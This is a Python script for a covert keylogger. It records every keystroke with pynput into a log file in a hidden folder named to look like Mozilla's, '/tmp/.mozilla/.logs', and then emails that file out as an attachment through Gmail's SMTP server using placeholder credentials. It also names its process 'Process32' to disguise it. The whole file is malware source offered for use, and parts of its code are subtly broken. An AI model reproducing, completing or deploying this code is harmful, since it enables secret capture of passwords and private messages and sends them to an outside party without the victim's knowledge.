#!/usr/bin/python3

def keystrokes():
    import os, multiprocessing, smtplib, time, logging
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders

    #generic email stuff
    email_user = 'email@gmail.com'
    email_password = 'password'
    email_send = 'email@gmail.com'
    subject = 'subject'

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    #where the log files is stored
    os.mkdir('/tmp/.mozilla/.logs')
    #log_dir = r"C:/users/username/desktop/"
    log_dir = "/tmp/.mozilla/.logs/"
    logging.basicConfig(filename= (log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]') 

    def keylogger():
        import logging, pynput
        from pynput.keyboard import Key, Listener

        #log_dir = "/tmp/.mozilla/.logs/"
        #logging.basicConfig(filename= (log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]') 

        def on_press(key):
            #logging.info('"{0}"'.format(key))
            logging.info(key)

        with Listener(on_press=on_press) as listener:
            listener.join()
    if __name__ == '__main__':
        proc = multiprocessing.Process(target=keylogger(), name="Process32", args=(10,))
        proc.start(), time.sleep(30), proc.terminate()
    # sending the screenshot
  
    body1 = 'This is the log file of the keys pressed!'
    msg.attach(MIMEText(body1,'plain'))

    fn1='/tmp/.mozilla/.logs/key_log.txt'
    attachment  =open(fn1,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+fn1)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)


    server.sendmail(email_user,email_send,text)
    server.quit()
